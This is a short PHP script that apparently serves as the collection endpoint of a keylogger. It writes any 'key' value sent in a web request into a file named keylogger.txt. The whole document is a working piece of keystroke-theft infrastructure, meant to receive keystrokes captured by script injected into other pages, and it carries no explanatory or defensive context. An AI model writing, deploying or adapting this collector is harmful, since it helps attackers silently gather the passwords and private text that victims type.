<?php
    if(!empty($_GET['key'])) {
        $logfile = fopen('keylogger.txt', 'a+');
        fwrite($logfile, $_GET['key']);
        fclose($logfile);
    }
?>